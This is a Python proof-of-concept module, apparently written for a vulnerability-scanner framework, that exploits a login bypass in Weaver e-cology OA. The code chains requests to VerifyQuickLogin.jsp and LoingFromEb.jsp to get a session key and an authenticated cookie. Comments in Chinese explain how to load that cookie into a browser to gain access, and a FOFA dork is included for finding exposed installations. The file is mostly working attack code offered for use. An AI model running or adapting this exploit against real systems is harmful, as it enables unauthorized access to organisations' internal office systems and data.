# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3,json
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "泛微e-cology登陆绕过",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "泛微e-cology",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            这个漏洞我是在一个偶然情况下得到的，我也不确定该叫什么，是不是0Day，大概率不是，  
            利用：用burp代理扫出存在漏洞以后将cookie取出来，放到浏览器里，最后访问/wui/main.jsp就可以登录进去了  
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="泛微-协同办公OA"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/wui/index.html" # url自己按需调整

        url1 = self.target + "/mobile/plugin/VerifyQuickLogin.jsp"
        data1 = "identifier=1&language=1&ipaddress=1.1.1.1"
        
        url2 = self.target + "/mobile/plugin/plus/login/LoingFromEb.jsp"
        data2 = "loginkey="

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 200 and "Set-Cookie" in str(req0.headers) and "ecology_JSessionid" in str(req0.headers):
                cookie = "ecology_JSessionid={cook}; JSESSIONID={cook}; __randcode__=bbd508af-295f-461a-a0a8-ba003dad8096".format(cook = req0.headers["Set-Cookie"].split(";")[0].split("=")[1])
                headers["Cookie"] = cookie
                req1 = requests.post(url1,data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                if "application/json" in req1.headers["Content-Type"] and "sessionkey" in req1.text:
                    sessionkey = json.loads(req1.text)["sessionkey"]
                    data2 += sessionkey
                    req2 = requests.post(url2,data2,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                    if req2.status_code == 200 and "window.location.href=\"/wui/main.jsp\";" in req2.text:
                        vuln = [True,req2.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()